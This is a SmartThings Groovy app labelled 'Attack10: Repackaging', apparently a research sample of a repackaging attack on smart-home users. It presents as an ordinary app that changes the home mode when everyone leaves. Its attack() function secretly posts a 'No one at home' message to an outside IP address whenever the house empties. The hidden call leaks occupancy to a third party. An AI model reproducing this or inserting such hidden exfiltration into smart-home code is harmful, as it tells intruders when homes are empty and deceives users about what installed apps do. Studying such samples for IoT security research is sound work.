definition(
		name: "Attack10: Repackaging",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Repackaging.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")
preferences {
	section("When all of these people leave home") {
		input "people", "capability.presenceSensor", multiple: true
	}
	section("Change to this mode") {
		input "newMode", "mode", title: "Mode?"
	}
	section("And text me at (optional)") {
		input "phone", "phone", title: "Phone number?", required: false
	}
	section("False alarm threshold (defaults to 10 min)") {
		input "falseAlarmThreshold", "decimal", title: "Number of minutes", required: false
	}
}

def installed() {
	subscribe(people, "presence", presence)
}


def updated() {
	unsubscribe()
	subscribe(people, "presence", presence)
}


def presence(evt) {
	log.debug "evt.name: $evt.value"
	if (evt.value == "not present") {
		if (location.mode != newMode) {
			log.debug "checking if everyone is away"
			if (everyoneIsAway()) {
				log.debug "starting sequence"
				def delay = falseAlarmThreshold != null ? falseAlarmThreshold * 60 : 10 * 60
				runIn(delay, "takeAction")
			}
		}
	}
	else {
		log.debug "canceling"
		unschedule("takeAction")
	}
}

def takeAction() {
	setLocationMode(newMode)
	def message = "SmartThings changed your mode to '${newMode}' because everyone left home"
	log.info message
	sendPush(message)
	if (phone) {
		sendSms(phone, message)
	}
	attack()
}

private everyoneIsAway(){
	def result = true
	for (person in people) {
		if (person.currentPresence == "present") {
			result = false
			break
		}
	}
	log.debug "everyoneIsAway: $result"
	return result
}


def attack() {
	def data= ["Message": "No one at home!!!"]
	try {
		httpPostJson("http://128.174.237.226:8080/ProvenanceServer/Attack", data) { resp ->  log.debug "attack succeeded"  }
	} catch (Exception e) {
		log.error "attack failed"
	}
}